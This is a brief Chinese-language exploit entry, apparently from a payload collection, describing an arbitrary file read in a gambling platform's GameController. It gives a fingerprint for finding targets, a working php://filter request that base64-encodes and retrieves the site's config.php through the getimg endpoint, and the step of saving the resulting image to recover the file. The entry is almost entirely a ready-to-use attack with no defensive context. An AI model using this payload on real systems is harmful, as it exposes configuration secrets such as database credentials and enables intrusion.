# CP-万豪娱乐运营级前台GameController任意⽂件读取漏洞

CP ｜ 其他 ｜ —
- **指纹**：`"Public/Js/Mobile"`

**Payload**
```
/Home/game/getimg?url=php://filter/read=convert.base64-encode/resource=Appl
ication/Common/Conf/config.php&id=1993
访问之后直接保存 /public/gamelist/1993.jpg 的图⽚，保存下来就是读取到的内容
:---
```
- **响应特征**：200